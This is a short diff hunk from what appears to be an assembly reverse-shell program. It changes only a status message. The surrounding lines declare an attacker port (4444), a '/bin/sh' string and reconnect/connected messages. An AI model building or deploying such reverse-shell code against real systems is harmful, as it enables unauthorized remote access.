@@ -7,7 +7,7 @@ section .data
     ATTACKERPORT dw 4444
     binsh db "/bin/sh", 0
     shstr db "sh", 0
-    msg_down db "[!] server seems down. reconnecting...", 10, 0
+    msg_down db "[!] server seems down. reconnecting ...", 10, 0
     msg_down_len equ $ - msg_down
     msg_connected db "[+] connected to server", 10, 0
     msg_conn_len equ $ - msg_connected
